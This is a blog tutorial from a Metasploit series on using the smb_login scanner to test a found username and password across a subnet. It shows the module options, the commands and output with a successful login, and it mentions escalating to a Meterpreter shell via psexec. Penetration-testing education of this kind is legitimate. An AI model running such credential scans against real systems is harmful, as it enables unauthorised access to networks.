---
draft: false
title: SMB Login Check in MSF
linkTitle: SMB Login Check
weight: 170
translationKey: smb-login-check-in-msf
date: 2017-05-18T13:02:00+03:00
author: İbrahim Korucuoğlu ([@siberoloji](https://github.com/siberoloji))
description: SMB Login Check with the username and password found in the previous steps.
url: /smb-login-check-in-msf/
featured_image: /images/metasploit.jpg
categories:
    - Metasploit Framework
tags:
    - cybersecurity
    - metasploit framework
keywords:
    - smb
---
In our previous articles, we have seen some of the “Information Gathering” modules. We discussed the issues of services not being found along with IP and Port scanning. The next stage is called “Vulnerability Scanning”. The better and healthier the “Information Gathering” operations from the Pentest stages are, the more efficient you will be in the following stages.

In the scans you have performed, you think that you have somehow found a username and password. You may want to try which other services use this username and password. At this point, the most logical service to try is the network file sharing service called `SMB`.

In the example below, the `smb_login` module is used and a previously found username and password are tried. In this type of scan, you should be careful if the target computer is Windows because every unsuccessful attempt is sent to the system administrator as a warning. You should know that the `smb_login` scan makes a lot of noise.

If your 'smb_login' scan is successful, you can try opening a 'Meterpreter' shell using the 'windows/smb/psexec' module.

```bash
msf > use auxiliary/scanner/smb/smb_login
msf auxiliary(smb_login) > show options

Module options (auxiliary/scanner/smb/smb_login):

 Name Current Setting Required Description
 ---- --------------- -------- -----------
 BLANK_PASSWORDS true no Try blank passwords for **all users
 BRUTEFORCE_SPEED 5 yes How fast to bruteforce, from 0 to 5
 PASS_FILE no File containing passwords, one per line
 PRESERVE_DOMAINS true no Respect a username that contains a domain name.
 RHOSTS yes The target address range or CIDR identifier
 RPORT 445 yes Set the SMB service port
 SMBDomain WORKGROUP no SMB Domain
 SMBPass no SMB Password
 SMBUser no SMB Username
 STOP_ON_SUCCESS false yes Stop guessing when a credential works for **a host
 THREADS 1 yes The number of concurrent threads
 USERPASS_FILE no File containing users and passwords separated by space, one pair per line
 USER_AS_PASS true no Try the username as the password for **all users
 USER_FILE no File containing usernames, one per line
 VERBOSE true yes Whether to print output for **all attempts

msf auxiliary(smb_login) > set RHOSTS 192.168.1.0/24
RHOSTS => 192.168.1.0/24
msf auxiliary(smb_login) > set SMBUser victim
SMBUser => victim
msf auxiliary(smb_login) > set SMBPass s3cr3t
SMBPass => s3cr3t
msf auxiliary(smb_login) > set THREADS 50
THREADS => 50
msf auxiliary(smb_login) > run

> 192.168.1.100 - FAILED 0xc000006d - STATUS_LOGON_FAILURE
> 192.168.1.111 - FAILED 0xc000006d - STATUS_LOGON_FAILURE
> 192.168.1.114 - FAILED 0xc000006d - STATUS_LOGON_FAILURE
> 192.168.1.125 - FAILED 0xc000006d - STATUS_LOGON_FAILURE
> 192.168.1.116 - SUCCESSFUL LOGIN (Unix)
> Auxiliary module execution completed

msf auxiliary(smb_login) >
```

As seen in the sample output, a successful login was performed at the IP address `192.168.1.116`.